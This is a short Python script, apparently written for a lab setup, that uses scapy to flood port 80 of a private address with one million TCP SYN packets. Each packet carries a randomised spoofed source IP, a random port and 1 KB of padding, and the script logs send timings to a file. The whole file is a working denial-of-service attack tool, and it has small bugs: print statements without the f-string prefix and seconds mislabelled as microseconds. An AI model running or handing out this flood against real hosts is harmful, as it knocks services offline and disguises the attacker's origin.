from scapy.layers.inet6 import IP, TCP, IPv6
from scapy.sendrecv import send
from scapy.all import *
import time



target_ip = "192.168.64.6" # "fe80::20ef:9bff:fec1:f270" # fe80::20ef:9bff:fec1:f270
target_port = 80

# Create a SYN packet
ip = IP(src=RandIP(), dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)

p = ip / tcp / raw

syn_packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")


counter = 0

with open("syn_results_p.txt", "w") as f:
    attack_start_time = time.time()
    for j in range(100):
        for i in range(10000):
            counter += 1
            start_time = time.time()
            send(p, verbose=0)
            end_time = time.time()
            t = (end_time - start_time)*1000000
            f.write(f"{counter}\n{t:.5f}\n")
            f.flush()

    attack_end_time = time.time()
    total_attack_time = attack_end_time - attack_start_time
    avg_time_per_packet = total_attack_time / 1000000
    f.write(f"total attack time: {total_attack_time:.5f} microseconds\n")
    f.write(f"Average time per packet: {avg_time_per_packet:.5f} microseconds\n")
    print("total attack time: {total_attack_time:.5f} microseconds\n")
    print("Average time per packet: {avg_time_per_packet:.5f} microseconds\n")

